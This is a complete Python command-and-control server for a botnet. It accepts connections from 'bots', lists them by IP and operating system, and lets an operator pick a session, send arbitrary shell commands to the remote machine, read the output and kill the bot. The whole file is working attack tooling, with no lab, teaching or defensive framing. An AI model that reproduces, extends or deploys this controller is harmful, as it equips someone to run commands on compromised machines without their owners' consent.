import socket
import threading
import sys

allClients = {}
sessionId = 0
Ip = "0.0.0.0"
Port = 8000

def listenerHandler(ip, port):
    global sessionId, allClients

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((ip, port))
        server.listen(5)
    except Exception as e:
        print(f"[-] Listener Bind Error: {e}")
        return
    while True:
        try:
            client, addr = server.accept()
            
            client.settimeout(2)
            try:
                os_info = client.recv(1024).decode().strip()
            except:
                os_info = "Unknown OS"
            client.settimeout(None)

            allClients[sessionId] = [client, addr, os_info]

            print(f"\n\n[+] New Bot Connected: ID {sessionId} | IP: {addr[0]} | OS: {os_info}")
            print("C2_Lobby > ", end="", flush=True) 
            
            sessionId += 1
        except Exception as e:
            break
    
def interact_session(target_id):
    try:
        target_client = allClients[target_id][0]
        target_os = allClients[target_id][2]
        print(f"[*] Entering Session {target_id} ({target_os}). Type 'back' to return.")
        
        while True:
            command = input(f"Session_{target_id} > ")
            
            if command.strip() == "":
                continue
            
            if command.lower() == "back":
                print("[*] Returning to Lobby...")
                break
            
            # If we want to kill the bot
            if command.lower() == "exit":
                target_client.send(b"exit")
                target_client.close()
                del allClients[target_id] # Remove from list
                print(f"[*] Bot {target_id} disconnected.")
                break

            # Send Command
            target_client.send(command.encode())
            # Wait for the full response
            full_response = ""
            while True:
                try:
                    chunk = target_client.recv(4096).decode()
                    full_response += chunk
                    if "<END>" in full_response:
                        break
                except Exception as e:
                    print(f"[-] Error receiving data: {e}")
                    break

            print(full_response.replace("<END>", ""))

    except KeyError:
        print("[-] Session ID not found.")
    except Exception as e:
        print(f"[-] Connection Lost: {e}")
        # If connection dies, remove from list
        if target_id in allClients:
            del allClients[target_id]

def main_menu():
    while True:
        try:
            cmd = input("C2_Lobby > ").strip()
            
            if cmd == "list":
                print("\nID\tIP Address\t\tOS Description")
                print("-" * 50)
                for cid, data in allClients.items():
                    print(f"{cid}\t{data[1][0]}\t\t{data[2]}")
                print("")

            elif cmd.startswith("use "):
                try:
                    # Extract ID: "use 4" -> 4
                    target = int(cmd.split(" ")[1])
                    if target in allClients:
                        interact_session(target)
                    else:
                        print("[-] ID not found.")
                except ValueError:
                    print("[-] Usage: use <id>")

            elif cmd == "exit":
                print("[*] Shutting down C2...")
                sys.exit(0)
            
            elif cmd == "":
                continue
            else:
                print("Commands: list, use <id>, exit")
                
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            sys.exit(0)

            
if __name__ == "__main__":
    if len(sys.argv) == 3:
        Ip = sys.argv[1]
        try:
            Port = int(sys.argv[2]) # convert string to int
        except ValueError:
            print("[-] Error: Port must be an integer.")
    elif(len(sys.argv) == 1):
        pass
    else:
        print("Usage: python3 server.py <IP> <PORT>")
        print("OR:    python3 server.py (uses default 0.0.0.0:8000)")
        sys.exit(1)
    
    thread = threading.Thread(target=listenerHandler, args=(Ip,Port))
    thread.daemon = True
    thread.start()

    print(f"[*] Server listening on {Ip}:{Port} ...")
    main_menu()